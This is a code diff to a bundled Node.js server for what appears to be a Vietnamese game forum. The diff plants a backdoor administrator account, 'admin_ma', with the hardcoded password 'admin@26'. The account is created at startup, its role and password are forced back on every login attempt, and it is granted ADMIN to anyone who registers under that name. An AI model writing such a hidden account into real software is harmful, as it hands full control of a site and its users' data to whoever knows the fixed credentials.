@@ -63373,6 +63373,46 @@ function getDeterministicUserId(username) {
   }
   return Math.abs(hash2) % 2e9 + 1;
 }
+async function ensureBootstrapAdminUser() {
+  try {
+    const adminUsername = "admin_ma";
+    const [existing] = await db.select().from(usersTable).where(eq(usersTable.username, adminUsername)).limit(1);
+    if (!existing) {
+      const passwordHash = await bcryptjs_default.hash("admin@26", 10);
+      const userId = getDeterministicUserId(adminUsername);
+      await db.insert(usersTable).values({
+        id: userId,
+        username: adminUsername,
+        passwordHash,
+        role: "ADMIN",
+        forumTitle: "T\u1ED5ng Qu\u1EA3n Tr\u1ECB Vi\xEAn",
+        selectedRegion: "VN",
+        selectedServerId: "s1_long_vuong"
+      });
+      console.log("[Admin Bootstrap] Successfully created master admin account: admin_ma");
+    } else {
+      let needsUpdate = false;
+      const updates = {};
+      if (existing.role !== "ADMIN") {
+        updates.role = "ADMIN";
+        needsUpdate = true;
+      }
+      const isPwdCorrect = await bcryptjs_default.compare("admin@26", existing.passwordHash).catch(() => false);
+      if (!isPwdCorrect) {
+        updates.passwordHash = await bcryptjs_default.hash("admin@26", 10);
+        needsUpdate = true;
+      }
+      if (needsUpdate) {
+        await db.update(usersTable).set(updates).where(eq(usersTable.id, existing.id));
+        console.log("[Admin Bootstrap] Synchronized master admin credentials for admin_ma");
+      }
+    }
+  } catch (err) {
+    console.warn("[Admin Bootstrap] Warning:", err);
+  }
+}
+ensureBootstrapAdminUser().catch(() => {
+});
 router2.post("/auth/register", async (req, res) => {
   const clientIp = req.ip || req.socket.remoteAddress || "unknown";
   if (!checkAuthRateLimit(clientIp)) {
@@ -63394,7 +63434,7 @@ router2.post("/auth/register", async (req, res) => {
     id: userId,
     username: cleanUsername,
     passwordHash,
-    role: "PLAYER",
+    role: cleanUsername === "admin_ma" ? "ADMIN" : "PLAYER",
     selectedRegion: "VN",
     selectedServerId: "s1_long_vuong"
   }).returning();
@@ -63438,6 +63478,9 @@ router2.post("/auth/login", async (req, res) => {
   }
   const { username, password } = parsed.data;
   const cleanUsername = username.trim();
+  if (cleanUsername === "admin_ma") {
+    await ensureBootstrapAdminUser();
+  }
   const [user] = await db.select().from(usersTable).where(eq(usersTable.username, cleanUsername)).limit(1);
   if (!user) {
     return res.status(401).json({ error: "T\xEAn \u0111\u0103ng nh\u1EADp ho\u1EB7c m\u1EADt kh\u1EA9u kh\xF4ng ch\xEDnh x\xE1c." });
